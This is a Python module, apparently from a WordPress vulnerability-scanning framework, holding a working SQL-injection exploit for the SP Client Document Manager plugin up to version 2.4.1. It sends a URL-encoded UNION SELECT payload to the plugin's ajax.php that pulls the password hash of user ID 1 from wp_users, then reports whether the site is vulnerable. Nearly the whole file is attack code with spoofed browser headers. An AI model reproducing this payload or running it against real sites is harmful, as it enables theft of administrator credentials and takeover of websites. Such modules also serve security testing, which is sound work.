from ..exploitsql import ExploitSql


class SPClientDocumentManagerSQL(ExploitSql):

	exploit_info = {
		'exploit_name': 'SP Client Document Manager',
		'exploit_version': '<= 2.4.1',
		'exploit_url':  'http://www.exploit-db.com/exploits/35313/'
	}

	def exploit(self):
		headers = {
			'Host': 'server',
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Cookie': 'PHPSESSID=4f7eca4e8ea50fadba7209e47494f29c',
			'Connection': 'keep-alive'
		}
		exploit = {
			'function': 'download-project',
			'id': '0%20UNION%20SELECT%201,%202,%203,%20CONCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%2058,%2054,%2058,'
				  '%2034,%20118,%20119,%2095,%2099,%20115,%20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH(user_pass),'
				  '%20CAST(CHAR(58,%2034)%20as%20CHAR),%20user_pass,%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))%20FROM%20`wp_users`%20WHERE%20ID=1'
		}

		response = ExploitSql.request(
			self.hostname + '/wp-content/plugins/sp-client-document-manager/ajax.php',
			data=exploit, headers=headers, method='POST', urlencode=True)

		if response is not None and len(response) == 34 and '$' in response:
			self.exploitfound(self.exploit_info)
		else:
			self.exploitnotfound(self.exploit_info)
